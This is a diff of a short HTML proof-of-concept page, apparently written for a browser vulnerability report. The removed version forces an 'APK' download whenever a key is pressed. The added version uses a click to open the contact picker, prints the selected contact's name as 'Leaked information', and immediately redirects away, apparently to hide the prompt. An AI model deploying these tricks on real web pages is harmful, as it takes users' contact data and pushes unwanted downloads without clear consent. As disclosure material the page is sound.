@@ -1,42 +1,29 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Download & Fullscreen on Keypress</title>
+    <title>PoC</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+
+    <script>
+        onclick = async () => {
+            (async () => {
+                let contacts = await navigator.contacts.select(["name"], {});
+                document.write(`
+                    <h1>
+                        <font color="red">Leaked information:</font> ${contacts[0]["name"]}
+                    </h1>
+                `);
+
+                // Replace open() with meta refresh
+                let meta = document.createElement("meta");
+                meta.httpEquiv = "refresh";
+                meta.content = "0;url=https://www.google.com";
+                document.head.appendChild(meta);
+            })();
+        }
+    </script>
 </head>
 <body>
-  <center><h2>POC by Chigorin!</h2></center>
-
-  <script>
-    // Listen to any keydown
-    window.addEventListener('keydown', function(e) {
-      // open the download
-      openWin();
-      // request fullscreen
-      //goFullScreen();
-    });
-
-    // Download helper
-    function Puf(uri, name) {
-      const link = document.createElement("a");
-      link.href = uri;
-      link.download = name;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    }
-
-    // Kick off your “APK” download
-    function openWin() {
-      Puf(
-        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
-        "montero.apk"
-      );
-    }
-
-  </script>
-  
-
-  
 </body>
 </html>
